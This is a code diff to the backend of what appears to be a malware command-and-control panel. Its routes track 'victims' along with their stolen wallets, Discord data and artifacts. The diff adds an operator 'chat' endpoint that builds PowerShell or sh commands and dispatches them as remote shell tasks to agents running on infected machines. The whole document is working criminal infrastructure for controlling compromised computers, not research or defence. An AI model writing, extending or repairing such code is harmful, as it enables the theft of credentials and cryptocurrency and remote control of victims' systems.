@@ -10,6 +10,7 @@ import { requireRole } from '../plugins/auth';
 import { artifactDir, safeRel } from '../services/artifact';
 import { isOnline } from '../lib/presence';
 import { publish } from '../lib/bus';
+import { dispatchCommand, hasControl } from './ws';
 
 const listQuery = z.object({
   q: z.string().max(128).optional(),
@@ -66,6 +67,7 @@ export const victimRoutes: FastifyPluginAsync = async (app) => {
       items: rows.map((row) => ({
         ...serializeVictim(row),
         online: isOnline(row.lastHeartbeatAt, row.lastAgentMessageAt),
+        socket: hasControl(row.id),
         wallets: row._count.wallets,
         artifacts: row._count.artifacts,
         _count: undefined
@@ -133,6 +135,7 @@ export const victimRoutes: FastifyPluginAsync = async (app) => {
       discordMissingAt: victim.discord?.missingAt ?? null,
       discordIgnored: Boolean(ignored),
       online: isOnline(victim.lastHeartbeatAt, victim.lastAgentMessageAt),
+      socket: hasControl(victim.id),
       balances: balanceCount
     };
   });
@@ -251,8 +254,52 @@ export const victimRoutes: FastifyPluginAsync = async (app) => {
 
   app.get('/victims/:id/events', async (request) => {
     const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
-    const items = await prisma.event.findMany({ where: { victimId: id }, orderBy: { createdAt: 'desc' }, take: 500 });
+    const query = z.object({ kind: z.string().max(64).optional() }).parse(request.query);
+    const items = await prisma.event.findMany({
+      where: { victimId: id, ...(query.kind ? { kind: query.kind } : {}) },
+      orderBy: { createdAt: 'desc' },
+      take: 500
+    });
     return { items };
+  });
+
+  app.get('/victims/:id/chat', async (request) => {
+    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
+    const items = await prisma.event.findMany({
+      where: { victimId: id, kind: { in: ['chat_out', 'chat_in'] } },
+      orderBy: { createdAt: 'asc' },
+      take: 200
+    });
+    return { items };
+  });
+
+  /** Chat del operador. Usa el message box del SO y guarda el hilo en `events`. */
+  app.post('/victims/:id/chat', { preHandler: requireRole('operator') }, async (request, reply) => {
+    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
+    const { text } = z.object({ text: z.string().trim().min(1).max(1000) }).parse(request.body);
+    const victim = await prisma.victim.findUnique({ where: { id }, select: { id: true, hostname: true, os: true, revokedAt: true } });
+    if (!victim) throw notFound('victim');
+    const safe = text.replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/'/g, "''").replace(/\r?\n/g, ' ');
+    const command = victim.os === 'windows'
+      ? `powershell -NoProfile -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show(\\"${safe}\\",\\"SPC · ${victim.hostname}\\")"`
+      : `sh -c "zenity --info --title='SPC · ${victim.hostname}' --text='${safe}' 2>/dev/null || notify-send 'SPC · ${victim.hostname}' '${safe}'"`;
+
+    const event = await prisma.event.create({
+      data: { victimId: id, kind: 'chat_out', data: { text, channel: 'panel' } as never, legacy: text }
+    });
+    if (victim.revokedAt || !hasControl(id)) {
+      return reply.code(409).send({ event, taskId: null, delivered: false, error: 'agent_offline' });
+    }
+    const task = await prisma.task.create({
+      data: { victimId: id, name: 'shell', params: { command } as never, timeoutSec: 60, priority: 1, createdById: request.operator!.id }
+    });
+    const delivered = await dispatchCommand(task).catch(() => false);
+    if (!delivered) {
+      await prisma.task.updateMany({ where: { id: task.id, status: 'queued' }, data: { status: 'error', error: 'agent_offline', finishedAt: new Date(), leaseUntil: null } });
+    }
+    await audit(prisma, { operatorId: request.operator?.id, action: 'victim.chat', entity: 'victim', entityId: id, ip: request.clientIp, data: { task: task.id, chars: text.length } });
+    void publish({ type: 'task.update', victimId: id, at: Date.now(), data: { id: task.id, name: 'shell', status: delivered ? 'queued' : 'error' } });
+    return reply.code(201).send({ event, taskId: task.id, delivered });
   });
 
   app.get('/victims/:id/files', async (request) => {
